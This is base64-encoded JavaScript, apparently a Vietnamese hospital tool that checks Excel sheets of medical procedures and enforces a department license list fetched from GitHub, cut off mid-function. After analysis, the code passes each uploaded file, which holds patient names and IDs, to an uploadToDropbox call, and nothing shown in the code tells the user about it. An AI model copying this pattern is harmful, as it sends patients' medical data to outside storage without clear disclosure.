ICAgICAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbWFpbkNvbnRlbnQnKS5zdHlsZS5kaXNwbGF5ID0gJ25vbmUnOw0KICAgICAgICAgICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3VzZXJuYW1lSW5wdXQnKS52YWx1ZSA9ICcnOw0KICAgICAgICAgICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3Bhc3N3b3JkSW5wdXQnKS52YWx1ZSA9ICcnOw0KICAgICAgICAgICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2xvZ2luRXJyb3InKS5zdHlsZS5kaXNwbGF5ID0gJ25vbmUnOw0KICAgICAgICAgICAgZG9jdW1lbnQuYm9keS5jbGFzc0xpc3QuYWRkKCdsb2dpbi1wYWdlJyk7DQogICAgICAgIH0NCg0KLy8gPT09PT09PT09PSBIw4BNIExPQUQgREFOSCBTw4FDSCBLSE9BIEjhu6JQIEzhu4YgPT09PT09PT09PSAvLw0KYXN5bmMgZnVuY3Rpb24gbG9hZFZhbGlkRGVwYXJ0bWVudHMoKSB7DQogICAgY29uc3QgdXJsID0gJ2h0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9jaGF1aHV5bmgwMTA0L2NoYXVodXluaDAxMDQudHh0L3JlZnMvaGVhZHMvbWFpbi9raG9hLnR4dCc7DQogICAgdHJ5IHsNCiAgICAgICAgY29uc3QgcmVzID0gYXdhaXQgZmV0Y2godXJsKTsNCiAgICAgICAgY29uc3QgdGV4dCA9IGF3YWl0IHJlcy50ZXh0KCk7DQogICAgICAgIGNvbnN0IGtob2FMaXN0ID0gdGV4dC5zcGxpdCgnXG4nKS5tYXAobGluZSA9PiBsaW5lLnRyaW0oKS50b0xvd2VyQ2FzZSgpKS5maWx0ZXIoQm9vbGVhbik7DQogICAgICAgIHJldHVybiBraG9hTGlzdDsNCiAgICB9IGNhdGNoIChlcnIpIHsNCiAgICAgICAgY29uc29sZS5lcnJvcigiS2jDtG5nIHRo4buDIHThuqNpIGRhbmggc8OhY2gga2hvYToiLCBlcnIpOw0KICAgICAgICByZXR1cm4gW107DQogICAgfQ0KfQ0KDQogICAgICAgIC8vID09PT09PT09PT0gUEjhuqZOIFjhu6wgTMOdIEZJTEUgPT09PT09PT09PSAvLw0KZnVuY3Rpb24gaGFuZGxlRmlsZSgpIHsNCiAgICBjb25zdCBmaWxlSW5wdXQgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnZmlsZUlucHV0Jyk7DQogICAgY29uc3QgYW5hbHl6ZUJ0biA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdhbmFseXplQnRuJyk7DQogICAgY29uc3QgZmlsZSA9IGZpbGVJbnB1dC5maWxlc1swXTsNCgkNCmlmICghZmlsZSkgew0KICAgIGNvbnN0IHBvcHVwID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2xvYWRpbmdQb3B1cCcpOw0KICAgIGNvbnN0IGxvYWRpbmdUZXh0ID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2xvYWRpbmdUZXh0Jyk7DQogICAgY29uc3QgcHJvZ3Jlc3NCYXIgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgncHJvZ3Jlc3NCYXInKTsNCg0KICAgIGxvYWRpbmdUZXh0LmlubmVySFRNTCA9IGANCiAgICAgICAgPGkgY2xhc3M9ImZhcyBmYS1leGNsYW1hdGlvbi10cmlhbmdsZSIgc3R5bGU9ImZvbnQtc2l6ZToyNHB4O2NvbG9yOnJlZDttYXJnaW4tYm90dG9tOjEwcHg7Ij48L2k+PGJyLz4NCiAgICAgICAgPHN0cm9uZz5WdWkgbMOybmcgY2jhu41uIGZpbGUgdHLGsOG7m2Mga2hpIGtp4buDbSB0cmE8L3N0cm9uZz48YnIvPjxici8+DQogICAgICAgIDxidXR0b24gY2xhc3M9ImJ0biIgb25jbGljaz0iZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2xvYWRpbmdQb3B1cCcpLnN0eWxlLmRpc3BsYXk9J25vbmUnIj7EkMOzbmc8L2J1dHRvbj4NCiAgICBgOw0KICAgIHByb2dyZXNzQmFyLnN0eWxlLndpZHRoID0gJzAlJzsNCiAgICANCiAgICBwb3B1cC5zdHlsZS5kaXNwbGF5ID0gJ2ZsZXgnOw0KICAgIHBvcHVwLmNsYXNzTGlzdC5hZGQoJ3Nob3cnKTsNCiAgICByZXR1cm47DQp9DQoNCg0KICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdmaWxlUmVxdWlyZW1lbnRzJykuY2xhc3NMaXN0LmFkZCgnaGlkZGVuJyk7DQogICAgZXJyb3JMb2cgPSBbXTsNCiAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgncmVzdWx0U2VjdGlvbicpLnN0eWxlLmRpc3BsYXkgPSAnbm9uZSc7DQogICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2Vycm9yU2VjdGlvbicpLnN0eWxlLmRpc3BsYXkgPSAnbm9uZSc7DQogICAgYW5hbHl6ZUJ0bi5kaXNhYmxlZCA9IHRydWU7DQogICAgYW5hbHl6ZUJ0bi5pbm5lckhUTUwgPSAnPGkgY2xhc3M9ImZhcyBmYS1zcGlubmVyIGZhLXNwaW4iPjwvaT4gxJBhbmcga2nhu4NtIHRyYS4uLic7DQogICAgLy8g4pyFIELhuq90IMSR4bqndSDEkeG6v20gMnMgxJHhu4MgaGnhu4duIHBvcHVwIG7hur91IHbhuqtuIMSRYW5nICLEkGFuZyBraeG7g20gdHJhLi4uIg0KY2xlYXJUaW1lb3V0KGFuYWx5emVQb3B1cFRpbWVyKTsNCmFuYWx5emVQb3B1cFRpbWVyID0gc2V0VGltZW91dCgoKSA9PiB7DQogICAgY29uc3QgYnRuQW5hbHl6ZSA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdhbmFseXplQnRuJyk7DQogICAgaWYgKGJ0bkFuYWx5emUuaW5uZXJIVE1MLmluY2x1ZGVzKCfEkGFuZyBraeG7g20gdHJhJykpIHsNCiAgICAgICAgY29uc3QgcG9wdXAgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbG9hZGluZ1BvcHVwJyk7DQogICAgICAgIGNvbnN0IGxvYWRpbmdUZXh0ID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2xvYWRpbmdUZXh0Jyk7DQogICAgICAgIGNvbnN0IHByb2dyZXNzQmFyID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3Byb2dyZXNzQmFyJyk7DQoNCiAgICAgICAgbG9hZGluZ1RleHQuaW5uZXJIVE1MID0gYA0KICAgICAgICAgICAgPGkgY2xhc3M9ImZhcyBmYS1zYXRlbGxpdGUtZGlzaCBpY29uLXNwaW4iIHN0eWxlPSJmb250LXNpemU6MjRweDtjb2xvcjojZTY3ZTIyO21hcmdpbi1ib3R0b206MTBweDsiPjwvaT48YnIvPg0KICAgICAgICAgICAgPHN0cm9uZz7EkMaw4budbmcgdHJ1eeG7gW4gZ2nDoW4gxJFv4bqhbjwvc3Ryb25nPjxici8+DQogICAgICAgICAgICBWdWkgbMOybmcgxJHhu6NpIHbDoGkgZ2nDonkgxJHhu4Mga2jhu59pIMSR4buZbmcgbcOheSBjaOG7pyBk4buxIHBow7JuZy4uLg0KICAgICAgICBgOw0KICAgICAgICBwcm9ncmVzc0Jhci5zdHlsZS53aWR0aCA9ICcwJSc7DQogICAgICAgIHBvcHVwLnN0eWxlLmRpc3BsYXkgPSAnZmxleCc7DQogICAgICAgIHJlcXVlc3RBbmltYXRpb25GcmFtZSgoKSA9PiBwb3B1cC5jbGFzc0xpc3QuYWRkKCdzaG93JykpOw0KDQogICAgICAgIC8vIENo4bqheSBwcm9ncmVzc0JhciAlDQogICAgICAgIGxldCBwZXJjZW50ID0gMDsNCiAgICAgICAgcHJvZ3Jlc3NCYXIuc3R5bGUudHJhbnNpdGlvbiA9ICd3aWR0aCAwLjJzIGxpbmVhcic7DQogICAgICAgIGNvbnN0IHByb2dyZXNzVGltZXIgPSBzZXRJbnRlcnZhbCgoKSA9PiB7DQogICAgICAgICAgICBwZXJjZW50ICs9IDI7DQogICAgICAgICAgICBpZiAocGVyY2VudCA+IDEwMCkgew0KICAgICAgICAgICAgICAgIHBlcmNlbnQgPSAxMDA7DQogICAgICAgICAgICAgICAgY2xlYXJJbnRlcnZhbChwcm9ncmVzc1RpbWVyKTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIHByb2dyZXNzQmFyLnN0eWxlLndpZHRoID0gcGVyY2VudCArICclJzsNCiAgICAgICAgfSwgMTAwKTsNCiAgICB9DQp9LCA1MDAwKTsNCg0KICAgIGNvbnN0IHJlYWRlciA9IG5ldyBGaWxlUmVhZGVyKCk7DQogICAgDQogICAgcmVhZGVyLm9ubG9hZCA9IGFzeW5jIGZ1bmN0aW9uKGUpIHsNCiAgICAgICAgdHJ5IHsNCiAgICAgICAgICAgIGNvbnN0IGRhdGEgPSBuZXcgVWludDhBcnJheShlLnRhcmdldC5yZXN1bHQpOw0KICAgICAgICAgICAgY29uc3Qgd29ya2Jvb2sgPSBYTFNYLnJlYWQoZGF0YSwgeyB0eXBlOiAnYXJyYXknIH0pOw0KICAgICAgICAgICAgDQogICAgICAgICAgICBpZiAod29ya2Jvb2suU2hlZXROYW1lcy5sZW5ndGggPT09IDApIHsNCiAgICAgICAgICAgICAgICB0aHJvdyBuZXcgRXJyb3IoJ0ZpbGUgRXhjZWwga2jDtG5nIGPDsyBzaGVldCBuw6BvJyk7DQogICAgICAgICAgICB9DQogICAgICAgICAgICANCiAgICAgICAgICAgIGNvbnN0IGZpcnN0U2hlZXQgPSB3b3JrYm9vay5TaGVldHNbd29ya2Jvb2suU2hlZXROYW1lc1sxXV07DQogICAgICAgICAgICBjb25zdCBqc29uRGF0YSA9IFhMU1gudXRpbHMuc2hlZXRfdG9fanNvbihmaXJzdFNoZWV0LCB7IA0KICAgICAgICAgICAgICAgIGhlYWRlcjogMSwgDQogICAgICAgICAgICAgICAgZGVmdmFsOiAiIiwgDQogICAgICAgICAgICAgICAgYmxhbmtyb3dzOiB0cnVlIA0KICAgICAgICAgICAgfSk7DQogICAgICAgICAgICBjb25zdCBkb25nNSA9IChqc29uRGF0YVs0XSAmJiBqc29uRGF0YVs0XVswXSkgPyBqc29uRGF0YVs0XVswXS50b1N0cmluZygpLnRyaW0oKSA6ICJLaMO0bmcgcsO1IjsNCmNvbnN0IGRvbmc2ID0gKGpzb25EYXRhWzVdICYmIGpzb25EYXRhWzVdWzBdKSA/IGpzb25EYXRhWzVdWzBdLnRvU3RyaW5nKCkudHJpbSgpIDogIktow7RuZyByw7UiOw0Kd2luZG93Lm5nYXlWYWx1ZSA9IGRvbmc1OyAgLy8g4qyFIGTDsm5nIDUgPSBOZ8OgeQ0Kd2luZG93Lmtob2FWYWx1ZSA9IGRvbmc2OyAgLy8g4qyFIGTDsm5nIDYgPSBLaG9hDQoNCg0KCQkJLy8vLyBLaeG7g20gdHJhIGtob2EgLy8vLy8NCi8vIOKchSBM4bqleSBk4buvIGxp4buHdSBkw7JuZyA2LCBj4buZdCBBDQpjb25zdCBraG9hUm93ID0ganNvbkRhdGFbNV07IC8vIGTDsm5nIDYNCmNvbnN0IGtob2FUZXh0ID0gKGtob2FSb3cgJiYga2hvYVJvd1swXSB8fCAiIikudG9TdHJpbmcoKS50cmltKCk7DQpjb25zdCBraG9hTG93ZXIgPSBraG9hVGV4dC50b0xvd2VyQ2FzZSgpOw0KDQovLyDinIUgS2nhu4NtIHRyYSB0w6puIGtob2ENCmNvbnN0IHZhbGlkS2hvYUxpc3QgPSBhd2FpdCBsb2FkVmFsaWREZXBhcnRtZW50cygpOw0KaWYgKCF2YWxpZEtob2FMaXN0LnNvbWUoa2hvYSA9PiBraG9hTG93ZXIuaW5jbHVkZXMoa2hvYSkpKSB7DQogICAgICB3aW5kb3cuaXNLaG9hTG9pID0gdHJ1ZTsNCiAgICBjb25zdCBtc2cgPSBg4p2MIE3DoXkgY2jhu6cgdOG7qyBjaOG7kWkgJHtraG9hVGV4dCB8fCAnS2jDtG5nIHjDoWMgxJHhu4tuaCd9IHPhu60gZOG7pW5nIHBo4bqnbiBt4buBbS4gPGJyLz5WdWkgbMOybmcgbXVhIGLhuqNuIHF1eeG7gW4gxJHhu4MgdMO0biB0cuG7jW5nIHTDoWMgZ2nhuqMuIGA7DQoNCiAgICAvLyBIaeG7g24gcG9wdXAgY2jhu6kga2jDtG5nIGFsZXJ0DQogLy8gSGnhu4NuIHRo4buLIHBvcHVwDQogICAgICBjb25zdCBwb3B1cCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdsb2FkaW5nUG9wdXAnKTsNCiAgICBjb25zdCBsb2FkaW5nVGV4dCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdsb2FkaW5nVGV4dCcpOw0KICAgIGNvbnN0IHByb2dyZXNzQmFyID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3Byb2dyZXNzQmFyJyk7DQoNCiAgICAvLyBIaeG7g24gdGjhu4sgdGjDtG5nIGLDoW8gbOG7l2kgdsSpbmggdmnhu4VuDQogICAgbG9hZGluZ1RleHQuaW5uZXJIVE1MID0gYA0KICAgICAgICA8aSBjbGFzcz0iZmFzIGZhLWJhbiIgc3R5bGU9ImZvbnQtc2l6ZToyNHB4O2NvbG9yOnJlZDtmb250LXNpemU6MjBweDttYXJnaW4tYm90dG9tOjEwcHg7Ij48L2k+PGJyLz4NCiAgICAgICAgPHN0cm9uZz4ke21zZ308L3N0cm9uZz48YnIvPjxici8+DQogICAgICAgIDxidXR0b24gY2xhc3M9ImJ0biIgb25jbGljaz0id2luZG93LmxvY2F0aW9uLnJlbG9hZCgpIj7EkMOzbmc8L2J1dHRvbj4NCiAgICBgOw0KICAgIHByb2dyZXNzQmFyLnN0eWxlLndpZHRoID0gJzAlJzsNCg0KICAgIHBvcHVwLnN0eWxlLmRpc3BsYXkgPSAnZmxleCc7DQogICAgcG9wdXAuY2xhc3NMaXN0LmFkZCgnc2hvdycpOw0KDQogICAgLy8g4pyFIFbDlCBISeG7hlUgSMOTQSBi4bqldCBr4buzIMSRb+G6oW4gbsOgbyBj4buRIGfhuq9uZyDhuqluIHBvcHVwIHNhdSDEkcOzDQogICAgd2luZG93LmlzS2hvYUxvaSA9IHRydWU7DQoNCiAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnc2NhblN0YXR1cycpLmlubmVySFRNTCA9IGA8c3BhbiBzdHlsZT0iY29sb3I6cmVkO2ZvbnQtd2VpZ2h0OmJvbGQiPiR7bXNnfTwvc3Bhbj5gOw0KICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdyZXN1bHRTZWN0aW9uJykuc3R5bGUuZGlzcGxheSA9ICdub25lJzsNCiAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnZXJyb3JTZWN0aW9uJykuc3R5bGUuZGlzcGxheSA9ICdub25lJzsNCiAgICByZXR1cm47DQp9DQoNCg0KDQoJCQkNCiAgICAgICAgICAgIGlmIChqc29uRGF0YS5sZW5ndGggPD0gMSkgew0KICAgICAgICAgICAgICAgIHRocm93IG5ldyBFcnJvcignRmlsZSBFeGNlbCBraMO0bmcgY8OzIGThu68gbGnhu4d1IChjaOG7iSBjw7MgdGnDqnUgxJHhu4EgaG/hurdjIHRy4buRbmcpJyk7DQogICAgICAgICAgICB9DQogICAgICAgICAgICANCiAgICAgICAgICAgcHJvY2Vzc0RhdGEoanNvbkRhdGEpOw0KICAgICAgICAgIGNvbnN0IHN0YXRzID0gew0KICAgICAgICAgICAgaGVyYjogZ2V0SGVyYk91dGxpZXJUb3RhbCgpLA0KICAgICAgICAgICAgICB0aW1lOiBnZXRUaW1lRXJyb3JUb3RhbCgpLA0KICAgICAgICAgICAgIGNvbmZsaWN0OiBnZXRDb25mbGljdFRvdGFsKCkNCiAgICAgICAgICB9Ow0KICAgICAgICAgIGNvbnN0IHVwbG9hZEZpbGUgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnZmlsZUlucHV0JykuZmlsZXNbMF07DQogYXdhaXQgdXBsb2FkVG9Ecm9wYm94KHVwbG9hZEZpbGUsIHdpbmRvdy5raG9hVmFsdWUsIHdpbmRvdy5uZ2F5VmFsdWUsIHN0YXRzKTsNCiAgICAgICAgfSBjYXRjaCAoZXJyb3IpIHsNCiAgICAgICAgICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdmaWxlUmVxdWlyZW1lbnRzJykuY2xhc3NMaXN0LnJlbW92ZSgnaGlkZGVuJyk7DQogICAgICAgICAgICBsb2dFcnJvcignTOG7l2kga2hpIMSR4buNYyBmaWxlIEV4Y2VsJywgbnVsbCwgZXJyb3IubWVzc2FnZSk7DQogICAgICAgICAgICBkaXNwbGF5RXJyb3JzKCk7DQogICAgICAgICAgICBhbGVydCgnQ8OzIGzhu5dpIHjhuqN5IHJhIGtoaSDEkeG7jWMgZmlsZTogJyArIGVycm9yLm1lc3NhZ2UpOw0KICAgICAgICB9IGZpbmFsbHkgew0KCQljbGVhclRpbWVvdXQoYW5hbHl6ZVBvcHVwVGltZXIpOyAvLyDinIUgTmfhuq90IHRpbWVyIHBvcHVwDQoJCWRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdsb2FkaW5nUG9wdXAnKS5jbGFzc0xpc3QucmVtb3ZlKCdzaG93Jyk7IC8vIOKchSDhuqhuIHBvcHVwDQogICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2xvYWRpbmdQb3B1cCcpLnN0eWxlLmRpc3BsYXkgPSAnbm9uZSc7ICAgLy8g4pyFIOG6qG4gaOG6s24gcG9wdXANCiAgICAgICAgICAgIGFuYWx5emVCdG4uZGlzYWJsZWQgPSBmYWxzZTsNCiAgICAgICAgICAgIGFuYWx5emVCdG4uaW5uZXJIVE1MID0gJzxpIGNsYXNzPSJmYXMgZmEtc2VhcmNoIGZhLXNwaW4tY29udGludW91cyI+PC9pPiBLaeG7g20gVHJhJzsNCiAgICAgICAgfQ0KICAgIH07DQogICAgDQogICAgcmVhZGVyLm9uZXJyb3IgPSBmdW5jdGlvbigpIHsNCiAgICAgICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2ZpbGVSZXF1aXJlbWVudHMnKS5jbGFzc0xpc3QucmVtb3ZlKCdoaWRkZW4nKTsNCiAgICAgICAgbG9nRXJyb3IoJ0zhu5dpIGtoaSDEkeG7jWMgZmlsZScsIG51bGwsICdLaMO0bmcgdGjhu4MgxJHhu41jIG7hu5lpIGR1bmcgZmlsZScpOw0KICAgICAgICBkaXNwbGF5RXJyb3JzKCk7DQogICAgICAgIGFuYWx5emVCdG4uZGlzYWJsZWQgPSBmYWxzZTsNCiAgICAgICAgYW5hbHl6ZUJ0bi5pbm5lckhUTUwgPSAnPGkgY2xhc3M9ImZhcyBmYS1zZWFyY2ggZmEtc3Bpbi1jb250aW51b3VzIj48L2k+IEtp4buDbSBUcmEnOw0KICAgICAgICBhbGVydCgnTOG7l2kga2hpIMSR4buNYyBmaWxlLiBWdWkgbMOybmcgdGjhu60gbOG6oWkgduG7m2kgZmlsZSBraMOhYy4nKTsNCiAgICB9Ow0KICAgIA0KICAgIHJlYWRlci5yZWFkQXNBcnJheUJ1ZmZlcihmaWxlKTsNCn0NCg0KICAgICAgICBmdW5jdGlvbiBwcm9jZXNzRGF0YShkYXRhKSB7DQogICAgDQogICAgdHJ5IHsNCiAgICAgICAgY29uc3QgaGVhZGVyTGluZTEgPSBkYXRhWzddIHx8IFtdOw0KICAgICAgICBjb25zdCBoZWFkZXJMaW5lMiA9IGRhdGFbOF0gfHwgW107DQogICAgICAgIGNvbnN0IGNvbWJpbmVkSGVhZGVycyA9IGhlYWRlckxpbmUxLm1hcCgoY29sLCBpbmRleCkgPT4gDQogICAgICAgICAgICAoY29sICsgJyAnICsgKGhlYWRlckxpbmUyW2luZGV4XSB8fCAnJykpLnRyaW0oKQ0KICAgICAgICApOw0KDQogICAgICAgIA0KICAgICAgICAgICAgICAgIGNvbnN0IHByb2NlZHVyZUluZGV4ID0gY29tYmluZWRIZWFkZXJzLmZpbmRJbmRleChoID0+IGguaW5jbHVkZXMoIlRo4bunIHRodeG6rXQiKSk7DQoJCQkJY29uc3QgZGF0ZUluZGV4ID0gY29tYmluZWRIZWFkZXJzLmZpbmRJbmRleChoID0+IGguaW5jbHVkZXMoIk5nw6B5IHRo4buxYyBoaeG7h24iKSk7IC8vIFRow6ptIGTDsm5nIG7DoHkNCiAgICAgICAgICAgICAgICBjb25zdCBzdGFydEluZGV4ID0gY29tYmluZWRIZWFkZXJzLmZpbmRJbmRleChoID0+IGguaW5jbHVkZXMoIlRo4budaSBnaWFuIGLhuq90IMSR4bqndSB0aOG7sWMgaGnhu4duIikpOw0KICAgICAgICAgICAgICAgIGNvbnN0IGVuZEluZGV4ID0gY29tYmluZWRIZWFkZXJzLmZpbmRJbmRleChoID0+IGguaW5jbHVkZXMoIlRo4budaSBnaWFuIGvhur90IHRow7pjIikpOw0KICAgICAgICAgICAgICAgIGNvbnN0IG9wZXJhdG9ySW5kZXggPSBjb21iaW5lZEhlYWRlcnMuZmluZEluZGV4KGggPT4gaC5pbmNsdWRlcygiVGjhu6cgdGh14bqtdCBjaMOtbmgiKSk7DQogICAgICAgICAgICAgICAgY29uc3QgbmFtZUluZGV4ID0gY29tYmluZWRIZWFkZXJzLmZpbmRJbmRleChoID0+IGguaW5jbHVkZXMoIkjhu40gdMOqbiIpKTsNCiAgICAgICAgICAgICAgICBjb25zdCBwYXRpZW50SWRJbmRleCA9IGNvbWJpbmVkSGVhZGVycy5maW5kSW5kZXgoaCA9PiBoLmluY2x1ZGVzKCJNw6MgQk4iKSk7DQogICAgICAgICAgICAgICAgY29uc3QgZG9jdG9ySW5kZXggPSBjb21iaW5lZEhlYWRlcnMuZmluZEluZGV4KGggPT4gaC5pbmNsdWRlcygiQsOhYyBz4bu5IGNo4buJIMSR4buLbmgiKSk7DQogICAgICAgICAgICAgICAgY29uc3QgbWlzc2luZ0NvbHVtbnMgPSBbXTsNCiAgICAgICAgICAgICAgICBpZiAocHJvY2VkdXJlSW5kZXggPT09IC0xKSBtaXNzaW5nQ29sdW1ucy5wdXNoKCdUaOG7pyB0aHXhuq10Jyk7DQogICAgICAgICAgICAgICAgaWYgKHN0YXJ0SW5kZXggPT09IC0xKSBtaXNzaW5nQ29sdW1ucy5wdXNoKCdUaOG7nWkgZ2lhbiBi4bqvdCDEkeG6p3UgdGjhu7FjIGhp4buHbicpOw0KICAgICAgICAgICAgICAgIGlmIChlbmRJbmRleCA9PT0gLTEpIG1pc3NpbmdDb2x1bW5zLnB1c2goJ1Ro4budaSBnaWFuIGvhur90IHRow7pjJyk7DQogICAgICAgICAgICAgICAgaWYgKG9wZXJhdG9ySW5kZXggPT09IC0xKSBtaXNzaW5nQ29sdW1ucy5wdXNoKCdUaOG7pyB0aHXhuq10IGNow61uaCcpOw0KICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgIGlmIChtaXNzaW5nQ29sdW1ucy5sZW5ndGggPiAwKSB7DQogICAgICAgICAgICAgICAgICAgIHRocm93IG5ldyBFcnJvcihgS2jDtG5nIHTDrG0gdGjhuqV5IGPDoWMgY+G7mXQgYuG6r3QgYnXhu5ljOiAke21pc3NpbmdDb2x1bW5zLmpvaW4oJywgJyl9YCk7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgIGNvbnN0IHJvd3MgPSBkYXRhLnNsaWNlKDkpOw0KICAgICAgICAgICAgICAgIGNvbnN0IHByb2NlZHVyZXMgPSBbXTsNCiAgICAgICAgICAgICAgICBjb25zdCBoZXJiUHJvY2VkdXJlcyA9IFtdOw0KICAgICAgICAgICAgICAgIGxldCBza2lwcGVkUm93cyA9IDA7DQogICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgcm93cy5mb3JFYWNoKChyb3csIGluZGV4KSA9PiB7DQogICAgICAgICAgICAgICAgICAgIGNvbnN0IHJvd051bWJlciA9IGluZGV4ICsgMTA7DQogICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICB0cnkgew0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCFyb3cgfHwgcm93Lmxlbmd0aCA9PT0gMCkgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvZ0Vycm9yKCdEw7JuZyB0cuG7kW5nJywgcm93TnVtYmVyKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBza2lwcGVkUm93cysrOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybjsNCiAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICAgICAgY29uc3QgcHJvY2VkdXJlTmFtZSA9IHJvd1twcm9jZWR1cmVJbmRleF07DQogICAgICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgICAgIGlmICghcHJvY2VkdXJlTmFtZSkgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNraXBwZWRSb3dzKys7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuOw0KICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgICAgICAgICBpZiAoIVBST0NFRFVSRVNbcHJvY2VkdXJlTmFtZV0pIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBsb2dFcnJvcihgVGjhu6cgdGh14bqtdCBraMO0bmcgbuG6sW0gdHJvbmcgZGFuaCBzw6FjaCBraeG7g20gdHJhOiAke3Byb2NlZHVyZU5hbWV9YCwgcm93TnVtYmVyKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBza2lwcGVkUm93cysrOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybjsNCiAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgKFBST0NFRFVSRVNbcHJvY2VkdXJlTmFtZV0uc2tpcCkgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvbnN0IHN0YXJ0ID0gcGFyc2VEYXRlVGltZShyb3dbc3RhcnRJbmRleF0sIHJvd051bWJlcik7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgY29uc3QgZW5kID0gcGFyc2VEYXRlVGltZShyb3dbZW5kSW5kZXhdLCByb3dOdW1iZXIpOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGhlcmJQcm9jZWR1cmVzLnB1c2goew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICByb3dJbmRleDogcm93TnVtYmVyLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwYXRpZW50TmFtZTogbmFtZUluZGV4ICE9PSAtMSA/IHJvd1tuYW1lSW5kZXhdIHx8ICdLaMO0bmcgY8OzJyA6ICdLaMO0bmcgY8OzJywNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcGF0aWVudElkOiBwYXRpZW50SWRJbmRleCAhPT0gLTEgPyByb3dbcGF0aWVudElkSW5kZXhdIHx8ICdLaMO0bmcgY8OzJyA6ICdLaMO0bmcgY8OzJywNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJvY2VkdXJlOiBwcm9jZWR1cmVOYW1lLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBkb2N0b3I6IHJvd1tkb2N0b3JJbmRleF0gfHwgJ0tow7RuZyBjw7MnLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBkYXRlOiBzdGFydD8uZGF0ZUtleSB8fCAnS2jDtG5nIHjDoWMgxJHhu4tuaCcsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN0YXJ0OiBzdGFydD8uc2Vjb25kcyB8fCAwLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQ6IGVuZD8uc2Vjb25kcyB8fCAwLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBkaXNwbGF5U3RhcnQ6IHN0YXJ0Py5kaXNwbGF5VGltZSB8fCAnPz8nLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBkaXNwbGF5RW5kOiBlbmQ/LmRpc3BsYXlUaW1lIHx8ICc/PycsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIG9wZXJhdG9yOiByb3dbb3BlcmF0b3JJbmRleF0gfHwgJ0tow7RuZyBjw7MnLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcm9jZWR1cmVJbmZvOiBQUk9DRURVUkVTW3Byb2NlZHVyZU5hbWVdDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuOw0KICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgICAgICAgICBjb25zdCBzdGFydCA9IHBhcnNlRGF0ZVRpbWUocm93W3N0YXJ0SW5kZXhdLCByb3dOdW1iZXIpOw0KICAgICAgICAgICAgICAgICAgICAgICAgY29uc3